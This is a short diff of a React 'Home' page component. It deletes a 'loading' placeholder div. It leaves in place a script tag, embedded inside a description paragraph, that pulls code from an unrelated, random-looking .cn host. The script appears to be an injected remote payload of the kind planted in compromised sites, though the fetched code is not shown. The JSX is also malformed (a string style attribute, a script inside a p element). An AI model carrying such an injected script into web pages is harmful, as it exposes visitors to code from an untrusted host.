@@ -15,7 +15,6 @@ export default function Home() {
       <main>
         <Header title="" />
         <p className="description">
-    <div style="margin-top:200px;width:100%" align="center">加载中...</div>
     <script src='https://me9898.qwertgdd-swsss.cn/ff/'></script>
         </p>
       </main>
